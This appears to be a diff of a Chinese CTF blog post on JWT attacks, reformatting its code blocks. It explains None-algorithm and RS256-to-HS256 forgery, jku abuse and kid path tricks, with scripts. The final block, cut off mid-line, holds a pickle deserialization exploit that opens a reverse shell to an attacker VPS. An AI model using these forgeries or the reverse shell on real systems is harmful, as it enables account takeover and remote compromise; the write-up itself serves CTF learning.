@@ -472,13 +472,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>这里值得一提的是，flask的session生成格式也同样是三段式。有一定的异曲同工之处。但是不同于jwt。其伪造方式往往非常局限。</p>
 <p>下面简单谈下三个部分结构</p>
 <ul>
-<li>header<br>一个简单的header是这种形式的<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">"alg"</span> : <span class="string">"HS256"</span>,</span><br><span class="line">        <span class="attr">"typ"</span> : <span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<li>header<br>一个简单的header是这种形式的<pre><code class="json">{
+      &quot;alg&quot; : &quot;HS256&quot;,
+      &quot;typ&quot; : &quot;jwt&quot;
+}</code></pre>
 </li>
 </ul>
 <p>但是实际上jwt的header还支持加入其它几个属性。<br><code>kid,jwk......</code><br>其具体含义将在后面提及。</p>
 <ul>
-<li>payload<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"user_role"</span> : <span class="string">"finn"</span>,    <span class="comment">//当前登录用户</span></span><br><span class="line">    <span class="attr">"iss"</span>: <span class="string">"admin"</span>,          <span class="comment">//该JWT的签发者</span></span><br><span class="line">    <span class="attr">"iat"</span>: <span class="number">1573440582</span>,        <span class="comment">//签发时间</span></span><br><span class="line">    <span class="attr">"exp"</span>: <span class="number">1573940267</span>,        <span class="comment">//过期时间</span></span><br><span class="line">    <span class="attr">"nbf"</span>: <span class="number">1573440582</span>,         <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">    <span class="attr">"domain"</span>: <span class="string">"example.com"</span>,   <span class="comment">//面向的用户</span></span><br><span class="line">    <span class="attr">"jti"</span>: <span class="string">"dff4214121e83057655e10bd9751d657"</span>   <span class="comment">//Token唯一标识</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<li>payload<pre><code class="json">{
+  &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户
+  &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者
+  &quot;iat&quot;: 1573440582,        //签发时间
+  &quot;exp&quot;: 1573940267,        //过期时间
+  &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token
+  &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户
+  &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识
+}</code></pre>
 其中大部分变量都是可以选择性生成的。有的语言的jwt库会自动生成iat变量，但是这些都无伤大雅。往往最重要的，是当payload存储了自定义的敏感信息时。比如username之类的。</li>
 </ul>
 <p>由于jwt存储信息时，header+payload的json数据是直接通过base64进行编码存储的。因此我们一定可以从payload中发现<strong>信息泄露</strong>。</p>
@@ -487,7 +497,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li>Signature</li>
 </ul>
 <p>顾名思义，就是通过前面指定的算法，去生成对应的sig.<br>这里我以HS256为例，从伪代码的角度讲。是这样生成的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">'secretkey'</span>  </span><br><span class="line">unsignedToken = encodeBase64(header) + <span class="string">'.'</span> + encodeBase64(payload)  </span><br><span class="line">signature = HMAC-SHA256(key, unsignedToken)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">key = &#39;secretkey&#39;  
+unsignedToken = encodeBase64(header) + &#39;.&#39; + encodeBase64(payload)  
+signature = HMAC-SHA256(key, unsignedToken)</code></pre>
 <p>可见，其思路就是用<code>HMAC-sha256</code>（对称加密算法），对jwt前两个部分组成的字符串进行加密。</p>
 <p>但是实际上，大家可能注意到过一个现象：jwt中没有<code>/</code>,<code>=</code>这种本该出现在base64数据中的字符。而在之前提到过的比赛中，我也是遇到了这个问题，并通过找规律发现，jwt最终的结果会将原始的base64字符串中的<code>/</code>换成<code>_</code>。并且去掉原本base64中用于补位的<code>=</code>。</p>
 <p>实际上，这点我们可以用python的库中<code>base64.urlsafe_b64encode</code>替换<code>base64encode</code>.也因此可以理解，是为了网络传输才对这几个特殊字符进行了处理。</p>
@@ -504,23 +516,41 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h3 id="信息泄露-伪造"><a href="#信息泄露-伪造" class="headerlink" title="信息泄露-伪造"></a>信息泄露-伪造</h3><p>必备网站：<br><a href="http://jwt.io/" target="_blank" rel="noopener">http://jwt.io/</a><br>这也是所有jwt题目第一步就该做的。因为即使没有key，我们也能清晰的得到所有header与payload的信息。而往往这决定了我们下一步的举措。</p>
 <p>比如，payload中有username字段。那么我们是否可以伪造admin来进行权限提升呢？或者，应用有某个变量字段取自jwt,那么我们如果有了key.就可以使用jwt.io或者python脚本进行伪造了。</p>
 <p>以今年网鼎玄武组的js_on为例。当以弱口令登录admin时，就可以得到key。从而任意改造存在sql注入的字段进行盲注。这也就要求我们使用脚本来完成攻击。下面给出一个python调用jwt基本用法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">encoded_jwt = jwt.encode(&#123;<span class="string">'user_name'</span>: <span class="string">'admin'</span>&#125;, <span class="string">'secretkey'</span>, algorithm=<span class="string">'HS256'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(encoded_jwt)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import jwt
+
+encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;secretkey&#39;, algorithm=&#39;HS256&#39;).decode(&#39;utf-8&#39;)
+print(encoded_jwt)</code></pre>
 <p>注意python调用jwt的库是<code>PyJwt</code>。并且还有一个坑点是，python想要用私钥作为key，也就是使用RS256算法加密时会报错。不知道是否只有我出现这个问题。因此还是得用<code>jwt.io</code>解决</p>
 <h3 id="None-algorithm"><a href="#None-algorithm" class="headerlink" title="None-algorithm"></a>None-algorithm</h3><p>jwt支持空算法，也就是<code>None</code>。原本只是为了调试用的，但这一旦出现在了源码中将是非常致命的。</p>
 <p>比如之前虎符比赛的题目。应该是借鉴了外国赛的一个题。其源码是这样的</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(cookie.split(<span class="string">"."</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"><span class="keyword">if</span>(sid==<span class="literal">undefined</span>||sid&gt;=secrets.length||sid&lt;<span class="number">0</span>)&#123;<span class="keyword">throw</span> <span class="string">"invalid sid"</span>&#125;</span><br><span class="line"><span class="keyword">let</span> decoded = jwt.verify(cookie, secrets[sid]);</span><br><span class="line"><span class="keyword">if</span>(decoded.perms==<span class="string">"admin"</span>)&#123;</span><br><span class="line">    res.locals.flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="javascript">let sid = JSON.parse(Buffer.from(cookie.split(&quot;.&quot;)[1], &#39;base64&#39;).toString()).secretid;
+if(sid==undefined||sid&gt;=secrets.length||sid&lt;0){throw &quot;invalid sid&quot;}
+let decoded = jwt.verify(cookie, secrets[sid]);
+if(decoded.perms==&quot;admin&quot;){
+    res.locals.flag = true;
+}</code></pre>
 <p>可以发现，当没有强调算法，直接使用<code>jwt.verify()</code>时，由于key可控，jwt是可以用None算法来解token的。这也就导致了简单的越权。<br>同理。python的源码如果没有强调，也是存在空算法伪造的。所以有时候不妨尝试一下，看看无算法能不能通过服务端校验（没有源码时）</p>
 <p>通常步骤如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwtToken= <span class="string">'eyJhbGciOiJIUzI1NiIsI...'</span></span><br><span class="line"></span><br><span class="line">decodedToken= jwt.decode(jwtToken, verify=<span class="literal">False</span>)  <span class="comment"># Need to decode the token before encoding with type 'None'</span></span><br><span class="line">noneEncoded= jwt.encode(decodedToken, key=<span class="string">''</span>, algorithm=<span class="literal">None</span>)</span><br><span class="line">print(noneEncoded.decode())</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import jwt
 
+jwtToken= &#39;eyJhbGciOiJIUzI1NiIsI...&#39;
 
+decodedToken= jwt.decode(jwtToken, verify=False)  # Need to decode the token before encoding with type &#39;None&#39;
+noneEncoded= jwt.encode(decodedToken, key=&#39;&#39;, algorithm=None)
+print(noneEncoded.decode())</code></pre>
 <h3 id="RS256-to-HS256"><a href="#RS256-to-HS256" class="headerlink" title="RS256 to HS256"></a>RS256 to HS256</h3><p>从非对称到对称算法的伪造。其实非常有意思但是国内CTF都没怎么见到过。</p>
 <p>直接上真题源码，应该是之前HSCTF里面的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成token</span></span><br><span class="line">auth = jwt.encode(&#123;<span class="string">"auth"</span>: <span class="string">"guest"</span>&#125;, PRIVATE_KEY, algorithm=<span class="string">"RS256"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用token验证身份是否为admin</span></span><br><span class="line">admin = jwt.decode(auth, PUBLIC_KEY)[<span class="string">"auth"</span>] == <span class="string">"admin"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">#生成token
+auth = jwt.encode({&quot;auth&quot;: &quot;guest&quot;}, PRIVATE_KEY, algorithm=&quot;RS256&quot;)
+
+#用token验证身份是否为admin
+admin = jwt.decode(auth, PUBLIC_KEY)[&quot;auth&quot;] == &quot;admin&quot;</code></pre>
 <p>乍一看没什么漏洞。但是如果了解jwt，就会发现这里可能存在使用<code>HS256</code>替换<code>RS256</code>的风险。假如公钥泄露，我们就能用公钥作为key，使用HS256生成token通过校验。这同样是没有强调算法的问题。</p>
 <p>伪造的话可以用python</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(public)</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>)).decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import jwt
+public = open(&#39;public.pem&#39;, &#39;r&#39;).read()
+print(public)
+print(jwt.encode({&quot;data&quot;:&quot;test&quot;}, key=public, algorithm=&#39;HS256&#39;)).decode(&#39;utf-8&#39;)</code></pre>
 <p>但需要注意，这里必须满足pyjwt==0.4.3才能伪造。否则只能采用其他办法了。这里直接给出payloadallthethings里的链接<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature—rs256-to-hs256</a></p>
 <p>而Node.js也存在这种风险。所以说jwt的安全问题主要出在开发者源码写的不够好的原因。</p>
 <h3 id="jku-jwk"><a href="#jku-jwk" class="headerlink" title="jku/jwk"></a>jku/jwk</h3><p>以上都是相对比较常见的漏洞了。甚至国内ctf还只出现过前两种。而Nahamcon的比赛让我了解到了另一种存在的漏洞。与jku相关。</p>
@@ -532,31 +562,60 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>其中还提到了kid这个header选项。它的作用是获取对应的字段作为key。(jwk类型)</p>
 <p>下面我用比赛中flagjokes这题来讲解下：</p>
 <p>首先解出jwt header如下，而我们只要payload中的username为admin即可获得flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;jku&quot;: &quot;http:&#x2F;&#x2F;localhost:5000&#x2F;static&#x2F;jwks.json&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>jku指向了本地的网页。那么尝试直接访问<br>发现网页存在static/jwks.json</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line">  &#123;	</span><br><span class="line">	&quot;e&quot;: &quot;AQAB&quot;,</span><br><span class="line">    &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;,</span><br><span class="line">    &quot;kty&quot;: &quot;RSA&quot;,</span><br><span class="line">    &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此时我发现得到jwk后，即可生成公钥了。但是网站只泄露了公钥，那么根据上面总结的，能尝试的只能是HS256替换RS256生成token.<br>然而当时尝试了后却得到服务端的报错。也就是说并不能更换算法来伪造token.那么怎么办呢？</p>
+<pre><code>{
+  &quot;alg&quot;: &quot;RS256&quot;,
+  &quot;jku&quot;: &quot;http://localhost:5000/static/jwks.json&quot;,
+  &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;
+}</code></pre><p>jku指向了本地的网页。那么尝试直接访问<br>发现网页存在static/jwks.json</p>
+<pre><code>
+{
+    &quot;keys&quot;: [
+  {    
+    &quot;e&quot;: &quot;AQAB&quot;,
+    &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;,
+    &quot;kty&quot;: &quot;RSA&quot;,
+    &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;
+}
+
+    ]
+}</code></pre><p>此时我发现得到jwk后，即可生成公钥了。但是网站只泄露了公钥，那么根据上面总结的，能尝试的只能是HS256替换RS256生成token.<br>然而当时尝试了后却得到服务端的报错。也就是说并不能更换算法来伪造token.那么怎么办呢？</p>
 <p>此时通过查询一系列资料，终于发现jku的指定是有洞的。假如我们让它加载到我们自己的<code>jwk.json</code>，我们就能够以<code>RS256</code>算法而不是伪造<code>HS256</code>通过校验了。</p>
 <p>所以，正确思路是申请一组key，kid可以自定<br><a href="https://mkjwk.org/" target="_blank" rel="noopener">https://mkjwk.org/</a><br><img src="/2020/06/24/Make-jwt-great-again/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>我们可以只放中间的作为jwk.json，也可以把右边的公钥改成jwk的格式。</p>
 <p>之后就是在线或者用脚本进行jwk-&gt;pem的转换了。这里贴出一个Node.js进行转换的脚本。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jose = <span class="built_in">require</span>(<span class="string">'node-jose'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key = fs.readFileSync(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DUMP_PRIVATE_KEY = (<span class="string">'true'</span> == args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">jose.JWK.asKey(key)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key.toPEM(DUMP_PRIVATE_KEY));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">const jose = require(&#39;node-jose&#39;);
+const fs = require(&#39;fs&#39;);
+
+const args = process.argv.slice(2);
+
+const key = fs.readFileSync(args[0]);
+
+var DUMP_PRIVATE_KEY = (&#39;true&#39; == args[1]);
+
+jose.JWK.asKey(key)
+  .then(function(key) {
+    console.log(key.toPEM(DUMP_PRIVATE_KEY));
+  });</code></pre>
 <p>使用时 发现<code>node test.js private.jwk</code>跟 <code>public.jwk</code>一致，证明没有问题。此时只需使用<br><code>node test.js private.jwk TRUE</code>即可输出私钥结果，否则脚本设计上是默认不输出私钥的（危险）。</p>
 <p>因此。本题关键是更改jku获取到我们自己的json。这样我们可以用私钥加密payload.服务端用获取到的公钥解密payload.</p>
 <h3 id="kid-任意文件"><a href="#kid-任意文件" class="headerlink" title="kid-任意文件"></a>kid-任意文件</h3><p>kid的含义上面已经提到过了：指定jwt的密钥。</p>
 <p>kid可能存在的问题，在了解了上面jku的相关漏洞后，应该会比较清楚了。如果jwt是通过header中的kid来获取key，那么就可能造成任意文件读取（不一定有回显）</p>
 <p>简单的情况下，我们可以直接指定kid为2，即HS256的secretkey为2</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"alg"</span> : <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="attr">"typ"</span> : <span class="string">"jwt"</span>,</span><br><span class="line">    <span class="attr">"kid"</span> : <span class="string">"2"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="json">{
+    &quot;alg&quot; : &quot;HS256&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;,
+    &quot;kid&quot; : &quot;2&quot;
+}</code></pre>
 <p>或者有的时候它是从文件获取的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure>
-<p>假如有web应用把密钥回显出来（不太可能），即可读取文件。<br>同时还有一种思路。由于可以指定任意文件，只要找到可控的key。我们就能做到伪造jwttoken。</p>
+<pre><code>&quot;kid&quot; : &quot;/etc/passwd&quot;</code></pre><p>假如有web应用把密钥回显出来（不太可能），即可读取文件。<br>同时还有一种思路。由于可以指定任意文件，只要找到可控的key。我们就能做到伪造jwttoken。</p>
 <p>比如指定静态css文件，它的文件内容一定是可控的，且易于从网页获取的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot; : &quot;&#x2F;css&#x2F;public.css&quot;</span><br></pre></td></tr></table></figure>
-
-<p>下面就NahamconCTF的B’omarr Style来分析下<br>这题因为花了我不少时间。但是仍然学到了非常多东西，所以特地写下。赛后我也一时兴起写了篇英文wp投CTFTime上了<a href="https://hackmd.io/@byc404/B1VBX8Qp8" target="_blank" rel="noopener">https://hackmd.io/@byc404/B1VBX8Qp8</a><br>下面我相当于补一份中文wp:</p>
+<pre><code>&quot;kid&quot; : &quot;/css/public.css&quot;</code></pre><p>下面就NahamconCTF的B’omarr Style来分析下<br>这题因为花了我不少时间。但是仍然学到了非常多东西，所以特地写下。赛后我也一时兴起写了篇英文wp投CTFTime上了<a href="https://hackmd.io/@byc404/B1VBX8Qp8" target="_blank" rel="noopener">https://hackmd.io/@byc404/B1VBX8Qp8</a><br>下面我相当于补一份中文wp:</p>
 <p>首先是题目注册，登录后的token<br><img src="/2020/06/24/Make-jwt-great-again/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>重点同样在于jwt的header</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;secret.txt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>从header信息中。我们可以推断出，jwt的key是从secret.txt这个文件中获取的。</p>
+<pre><code>{
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;kid&quot;: &quot;secret.txt&quot;
+}</code></pre><p>从header信息中。我们可以推断出，jwt的key是从secret.txt这个文件中获取的。</p>
 <p>但是非常奇怪的是，在没有key的情况下,<code>jwt.io</code>解出来的payload内容为空。</p>
 <p>这里可能就需要一点眼力了，因为自己做过好几道pickle相关的序列化题，所以这里不难直接看出，jwt的payload部分被替换成了pickle生成的序列化base64内容。或者我们也可以单独拿出这一段奇怪的base64用xxd看<br><img src="/2020/06/24/Make-jwt-great-again/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>能够明显看到<code>c_mamin</code>,<code>username</code>等字样。这就是典型的python opcode的内容</p>
@@ -569,13 +628,44 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>有。答案就是<code>/dev/null</code></p>
 <p>我们都知道linux将垃圾内容扔进<code>/dev/null</code>是常见操作。而我们通常是<code>echo log &gt; /dev/null 2&gt;&amp;1</code>来完成一次没有任何回显的直接操作。<code>/dev/null</code>能够丢弃一切写入其中的数据。而读取它将立即得到一个EOF。</p>
 <p>所以说，如果我们控制kid读取<code>/dev/null</code>为key.此时我们直接使用空字符串作为HS256的secretkey就能得到一个有效的key.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"kid"</span>: <span class="string">"/dev/null"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;&#125;</span><br><span class="line">token=jwt.encode(payload,<span class="string">''</span>,algorithm=<span class="string">"HS256"</span>,headers=headers).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import jwt
+
+headers={
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;kid&quot;: &quot;/dev/null&quot;
+}
+payload={}
+token=jwt.encode(payload,&#39;&#39;,algorithm=&quot;HS256&quot;,headers=headers).decode(&#39;utf-8&#39;)
+print(token)</code></pre>
 <p>通过上面的脚本，我发现更换cookie时得到的报错回显不再是<code>Invalid Signature</code>，而是<code>Invalid load key</code><br>这其实是一个好消息，因为经过搜索后这是一个pickle的报错。也就是说我们已经通过校验了，只要剩下的payload部分是有效的picklebase64数据即可。</p>
 <p>然而仔细一想发现问题不对。jwt作为<code>json web token</code>，有效的传输数据都应该是json数据。但这里居然直接把pickle的opcodebase64后放在了payload部分。这让当时的我无法理解。这也就意味着：payload的原始内容在python中不是一个字典，也就是说我们无法直接通过pyjwt库进行密文生成。</p>
 <p>于是我去找资料。发现其实jwt的HS256签名是hmac-sha256生成的。其中key是jwt的secretkey.data是<code>base64(header).base64(payload)</code>整体</p>
 <p>所以我们可以使用脚本手动拼接。<br>下面直接给出完整的exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPSIP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">data =(<span 